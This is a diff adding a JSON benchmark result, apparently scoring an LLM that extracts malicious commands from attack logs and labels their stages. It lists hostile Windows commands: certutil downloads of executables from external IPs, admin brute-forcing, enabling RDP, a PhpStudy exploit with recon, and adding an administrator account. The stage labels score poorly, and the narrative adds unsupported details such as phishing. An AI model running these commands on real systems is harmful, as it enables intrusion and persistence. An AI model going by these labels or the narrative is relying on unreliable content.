@@ -1,0 +1,134 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d \\\"D:/phpStudy/WWW\\\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"cd /d \\\"D:/phpStudy/WWW\\\"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe  -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c \"cd /d \\\"D:/phpStudy/WWW\\\"&C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "ywm.exe",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\Windows\\svchost.exe",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "A sophisticated cyberattack unfolds, starting with the exploitation of a vulnerable web application. The attackers initially gain access through a phishing email or exploiting a vulnerability in the Apache server running on port 80. They then upload malware using the CertUtil utility, disguising it as a legitimate system component for persistence. Utilizing legitimate system functions like software updates and crash handlers, they continue to maintain control over the compromised system. Further escalation occurs when they create a new administrative account. Laterally they move throughout the network gathering valuable intelligence through various means: executing reconnaissance scripts, examining IP addresses and DNS records, pinging servers, and finally uploading files.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37350,
+      "completion_tokens": 3495,
+      "total_tokens": 40845,
+      "wall_clock_s": 41.74,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2857142857142857,
+      "recall": 0.6,
+      "f1": 0.3870967741935483,
+      "tp": 6,
+      "fp": 15,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.047619047619047616,
+      "recall": 0.16666666666666666,
+      "f1": 0.07407407407407407,
+      "tp": 1,
+      "fp": 20,
+      "fn": 5,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.06666666666666667,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37350,
+      "completion_tokens": 3495,
+      "total_tokens": 40845,
+      "wall_clock_s": 41.74,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
